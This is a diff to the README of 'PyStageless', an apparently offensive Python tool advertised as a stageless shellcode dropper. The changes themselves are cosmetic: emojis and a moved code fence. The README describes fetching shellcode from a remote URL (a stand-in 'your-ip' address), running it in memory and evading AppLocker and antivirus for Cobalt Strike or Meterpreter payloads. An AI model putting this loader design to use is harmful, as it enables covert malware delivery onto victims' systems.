@@ -1,7 +1,4 @@
-# 
-
----
-# PyStageless  Stageless Shellcode Dropper in Python
+# 🧪 PyStageless  Stageless Shellcode Dropper in Python
 
 ![Python](https://img.shields.io/badge/Python-3.9%2B-3776AB?logo=python&logoColor=white)
 ![Windows](https://img.shields.io/badge/Windows-10%2B-0078D6?logo=windows)
@@ -13,14 +10,14 @@
 > Pure Python stageless shellcode loader. No files on disk. Zero traces. 
 Pure chaos.
 
-### Features
+### ✨ Features
 - Downloads raw shellcode from remote URL  
 - Executes directly in memory via `ctypes`  
 - Runs in background thread  
 - Bypasses AppLocker & most AV by default  
 - Works with Cobalt Strike, Meterpreter, custom payloads  
 
-## Quick Start
+## 🚀 Quick Start
 
 ### Payload Development - msfvenom
 
@@ -39,9 +36,9 @@ SHELLCODE_URL = "http://your-ip:80/shellcode.bin"
 
 # 3. Run
 python pystageless.py
+```
 
 ---
-```
 
 ### Standalone exe Compilation
 
